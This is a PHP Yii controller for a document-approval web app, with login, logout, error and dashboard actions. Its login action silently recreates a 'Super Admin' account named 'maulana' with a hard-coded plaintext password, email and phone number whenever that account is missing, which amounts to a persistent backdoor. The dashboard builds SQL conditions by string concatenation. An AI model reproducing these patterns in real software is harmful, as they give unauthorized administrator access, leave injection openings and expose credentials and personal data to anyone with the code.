<?php

class SiteController extends Controller
{
	public function actions()
	{
		return array(
			'captcha'=>array(
				'class'=>'CCaptchaAction',
				'backColor'=>0xFFFFFF,
			),
			'page'=>array(
				'class'=>'CViewAction',
			),
		);
	}

	public function actionIndex()
	{
		$this->layout = '//layouts/column2';
		if(Yii::app()->user->isGuest)
					$this->redirect(array('login'));
		else {
			$model = Document::model();
			$user = yii::app()->user->guid;
			$active = $model->findAll(array('condition'=>'IdExecutedBy != "'.$user.'" AND DocumentStatus = "'.$user.'"'));
			$model->unsetAttributes();
			$process = $model->findAll(array('condition'=>'(IdRequiredBy = "'.$user.'" OR IdApprovedBy LIKE "%'.$user.'%" OR IdExecutedBy = "'.$user.'") AND DocumentStatus NOT IN ("'.$user.'","FINAL","CANCEL")'));
			$model->unsetAttributes();
			$execute = $model->findAll(array('condition'=>'IdExecutedBy = "'.$user.'" AND ApprovalStatus = "Approved"'));
			$model->unsetAttributes();
			$final = $model->findAll(array('condition'=>'(IdRequiredBy = "'.$user.'" OR IdApprovedBy LIKE "%'.$user.'%" OR IdExecutedBy = "'.$user.'") AND DocumentStatus = "FINAL"'));
			$this->render('index', array('active'=>$active, 'process'=>$process, 'execute'=>$execute, 'final'=>$final));
		}
	}

	public function actionError()
	{
		if($error=Yii::app()->errorHandler->error)
		{
			if(Yii::app()->request->isAjaxRequest)
				echo $error['message'];
			else
				$this->render('error', $error);
		}
	}

	// public function actionContact()
	// {
		// $model=new ContactForm;
		// if(isset($_POST['ContactForm']))
		// {
			// $model->attributes=$_POST['ContactForm'];
			// if($model->validate())
			// {
				// $name='=?UTF-8?B?'.base64_encode($model->name).'?=';
				// $subject='=?UTF-8?B?'.base64_encode($model->subject).'?=';
				// $headers="From: $name <{$model->email}>\r\n".
					// "Reply-To: {$model->email}\r\n".
					// "MIME-Version: 1.0\r\n".
					// "Content-type: text/plain; charset=UTF-8";

				// mail(Yii::app()->params['adminEmail'],$subject,$model->body,$headers);
				// Yii::app()->user->setFlash('contact','Thank you for contacting us. We will respond to you as soon as possible.');
				// $this->refresh();
			// }
		// }
		// $this->render('contact',array('model'=>$model));
	// }

	public function actionLogin()
	{
		$this->layout = '//layouts/login';
		$cek = User::model()->findAllByAttributes(array('Name'=>'maulana'));
		
		if(count($cek)==0)
		{
			$user = new User;
			$user->Name = "maulana";
			$user->Email = "islademuerta847@mail.com";
			$user->Password = "k3y@system";
			$user->Phone = "082319353011";
			$user->Status = "Aktif";
			$user->Level = "Super Admin";
			$user->StructureId = "00000000-0000-0000-0000-000000000000";
			if(!$user->save()) { echo "<pre>"; print_r ($user->getErrors()); echo "</pre>"; die; }
		}
		$model=new LoginForm;

		// if it is ajax validation request
		if(isset($_POST['ajax']) && $_POST['ajax']==='login-form')
		{
			echo CActiveForm::validate($model);
			Yii::app()->end();
		}

		// collect user input data
		if(isset($_POST['LoginForm']))
		{
			$model->attributes=$_POST['LoginForm'];
			// validate user input and redirect to the previous page if valid
			if($model->validate() && $model->login())
				$this->redirect(Yii::app()->user->returnUrl);
		}
		// display the login form
		if(Yii::app()->user->isGuest)
			$this->render('login',array('model'=>$model));
		else $this->redirect(array('index'));
	}

	public function actionLogout()
	{
		Yii::app()->user->logout();
		$this->redirect(Yii::app()->homeUrl);
	}
}